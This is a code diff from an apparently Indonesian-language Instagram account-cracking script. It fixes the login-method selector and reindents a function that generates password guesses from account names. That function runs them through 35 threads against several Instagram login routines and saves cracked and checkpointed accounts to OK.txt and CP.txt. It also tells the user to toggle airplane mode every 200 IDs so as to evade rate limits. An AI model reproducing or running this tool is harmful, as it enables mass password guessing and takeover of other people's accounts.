@@ -493,56 +493,56 @@ def crack():
 	elif method in ['02','2']: SistemLog = "ini"
 	elif method in ['03','3']: SistemLog = "www"
 	elif method in ['04','4']: SistemLog = "bi"
-	else:SistemLog = "api.instagram.com"
+	else:SistemLog = "api"
 	apsw()
 
 	
-def apsw(method):
-    global iniapabree, kaloinijugaapa
-    console.print(f'\n {H2}• {P2}Tambah Password Sendiri? (y/t)')
-    weskas = console.input(f' {H2}• {P2}Masukan : ').lower()
-    if weskas in ['y','ya','Y']:
-       console.print(f' {H2}• {P2}Gunakan koma buat pemisah')
-       paswd = console.input(f' {H2}• {P2}Masukan : ')
-       for y in paswd.split(','):
-           if len(y) <=5:pass
-           else:pw_add.append(y)
-    else:pass
-    console.print(Panel(f"""{P2}[{color_text}01{P2}]. Lambat\n{P2}[{color_text}02{P2}]. Cepat""",width=60, title="MENU FAST/SLOW", style=f"{color_panel}"))
-    lib = console.input(f' {H2}• {P2}Masukan : ')
-    if lib in ['1','01']:login.update({'Lib':'htx'})
-    else:login.update({'Lib':'req'})
-    urut = []
-    urut.append(panel(f'[bold green]OK/OK.txt [bold white]',width=30,title=f"[bold green]OK SAVE",style=f"{color_panel}"))
-    urut.append(panel(f'[bold yellow]CP/CP.txt [bold white]',width=30,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
-    console.print(Columns(urut))
-    Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]200[bold yellow] ID ',title=f"[bold yellow]CRACK-FANKY-GANTENG",width=60,style=f"{color_panel}"))
-    iniapabree = Progress(TextColumn('{task.description}'))
-    kaloinijugaapa = iniapabree.add_task('',total=len(fanids))
-    with iniapabree:
-       with ThreadPoolExec(max_workers=35) as fannjha:
-          for i in fanids:
-             username, password = i.split('<<=>>')
-             password = generate(password.lower())
-             if SistemLog == "api":
-		     fannjha.submit(api_insta, username, password)
-	     elif SistemLog == "ini":
-		     fannjha.submit(i_insta, username, password)
-	     elif SistemLog == "www":
-		     fannjha.submit(www_insta, username, password)
-	     elif SistemLog == "bi":
-		     fannjha.submit(threads, username, password)
-	     else:
-		     fannjha.submit(api_insta, username, password)
-    if success == 0 and checkpoint == 0:
-       console.print(f' {H2}• {P2}Maaf Bree Kamu Gk Dapat Hasil')
-       exit()
-    else:
-       Console().print(Panel(f"[bold green]Crack Telah Selesai ngap, btw fanky ganteng",subtitle="╭───",subtitle_align="left",title=f"[bold green]FINISH",width=60,style=f"{color_panel}"))
-       Console().print(f"[bold cyan]   ╰[bold green] OK ─> {success}	[bold yellow]CP ─> {checkpoint}")
-       print("")
-       exit()
-    quit(0)
+def apsw():
+	global iniapabree, kaloinijugaapa
+	console.print(f'\n {H2}• {P2}Tambah Password Sendiri? (y/t)')
+	weskas = console.input(f' {H2}• {P2}Masukan : ').lower()
+	if weskas in ['y','ya','Y']:
+		console.print(f' {H2}• {P2}Gunakan koma buat pemisah')
+		paswd = console.input(f' {H2}• {P2}Masukan : ')
+		for y in paswd.split(','):
+			if len(y) <=5:pass
+			else:pw_add.append(y)
+	else:pass
+	console.print(Panel(f"""{P2}[{color_text}01{P2}]. Lambat\n{P2}[{color_text}02{P2}]. Cepat""",width=60, title="MENU FAST/SLOW", style=f"{color_panel}"))
+	lib = console.input(f' {H2}• {P2}Masukan : ')
+	if lib in ['1','01']:login.update({'Lib':'htx'})
+	else:login.update({'Lib':'req'})
+	urut = []
+	urut.append(panel(f'[bold green]OK/OK.txt [bold white]',width=30,title=f"[bold green]OK SAVE",style=f"{color_panel}"))
+	urut.append(panel(f'[bold yellow]CP/CP.txt [bold white]',width=30,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
+	console.print(Columns(urut))
+	Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]200[bold yellow] ID ',title=f"[bold yellow]CRACK-FANKY-GANTENG",width=60,style=f"{color_panel}"))
+	iniapabree = Progress(TextColumn('{task.description}'))
+	kaloinijugaapa = iniapabree.add_task('',total=len(fanids))
+	with iniapabree:
+		with ThreadPoolExec(max_workers=35) as fannjha:
+			for i in fanids:
+				username, password = i.split('<<=>>')
+				password = generate(password.lower())
+				if SistemLog == "api":
+					fannjha.submit(api_insta, username, password)
+				elif SistemLog == "ini":
+					fannjha.submit(i_insta, username, password)
+				elif SistemLog == "www":
+					fannjha.submit(www_insta, username, password)
+				elif SistemLog == "bi":
+					fannjha.submit(threads, username, password)
+				else:
+					fannjha.submit(api_insta, username, password)
+	if success == 0 and checkpoint == 0:
+		console.print(f' {H2}• {P2}Maaf Bree Kamu Gk Dapat Hasil')
+		exit()
+	else:
+		Console().print(Panel(f"[bold green]Crack Telah Selesai ngap, btw fanky ganteng",subtitle="╭───",subtitle_align="left",title=f"[bold green]FINISH",width=60,style=f"{color_panel}"))
+		Console().print(f"[bold cyan]   ╰[bold green] OK ─> {success}	[bold yellow]CP ─> {checkpoint}")
+		print("")
+		exit()
+	quit(0)
 
 def generate(name):
     xxx = []
